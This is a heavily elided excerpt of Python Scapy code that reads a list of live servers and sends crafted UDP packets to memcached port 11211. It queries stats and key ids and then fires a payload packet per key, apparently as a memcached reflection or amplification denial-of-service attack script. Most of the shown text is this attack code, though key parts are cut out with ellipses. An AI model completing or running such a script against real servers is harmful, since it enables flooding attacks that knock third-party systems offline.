...
with open('alive-servers.txt') as servers:
    for line in servers:
...
try:
    for server in SERVER_LIST:
        ...
        udp = UDP(sport=80, dport=11211)/statitems_packet
        keyids = []
        resp = sr1(ip/udp)
        ...
        for kid in keyids:
            ...
            udp = UDP(sport=80, dport=11211)/keyid_packet
        ...
        for key in keys:
            ...
            udp = UDP(sport=80, dport=11211)/fun_packet
            sr1(ip/udp)
